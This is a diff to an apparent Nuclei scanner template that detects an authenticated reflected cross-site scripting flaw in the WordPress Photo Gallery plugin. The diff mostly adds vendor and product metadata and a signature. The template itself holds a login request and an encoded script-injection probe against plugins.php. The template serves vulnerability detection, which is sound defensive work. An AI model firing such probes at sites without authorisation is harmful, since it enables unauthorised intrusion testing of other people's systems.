@@ -10,11 +10,15 @@ info:
   reference:
     - https://wpscan.com/vulnerability/e9f9bfb0-7cb8-4f92-b436-f08442a6c60a
     - https://wordpress.org/plugins/photo-gallery/advanced/
+  classification:
+    cpe: cpe:2.3:a:10web:photo_gallery:*:*:*:*:wordpress:*:*:*
   metadata:
-    max-request: 2
     verified: true
+    max-request: 2
+    vendor: 10web
+    product: photo_gallery
     publicwww-query: "/wp-content/plugins/photo-gallery"
-  tags: wp,wp-plugin,wordpress,xss,photo-gallery,authenticated
+  tags: wpscan,wp,wp-plugin,wordpress,xss,photo-gallery,authenticated
 
 http:
   - raw:
@@ -24,12 +28,10 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
-
       - |
         GET /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
 
-    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: word
@@ -47,3 +49,4 @@ http:
       - type: status
         status:
           - 200
+# digest: 4b0a00483046022100812506ef68eb5b9f40f0951b7583a9606ef3c272f28113508111ec77eef18bdb022100a2f3a9483e0590d36b6b2238b52430db8f1c91770f4c04957214d73a8b0c0bae:922c64590222798bb761d5b6d8e72950
